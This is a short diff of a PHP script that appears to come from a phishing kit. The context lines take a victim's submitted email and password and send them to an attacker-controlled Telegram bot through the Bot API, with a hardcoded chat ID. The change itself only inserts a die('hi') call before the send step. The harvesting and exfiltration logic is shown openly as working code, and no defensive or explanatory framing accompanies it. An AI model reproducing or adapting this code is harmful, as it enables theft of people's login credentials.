@@ -9,7 +9,7 @@
 
   // Create a Telegram message with the form data
   $message = "Email: $username\nPassword: $password";
-
+  die("hi");
   // Send the message to the Telegram bot
   $url = "https://api.telegram.org/bot$token/sendMessage";
   $data = array('chat_id' => '1955367555', 'text' => $message);
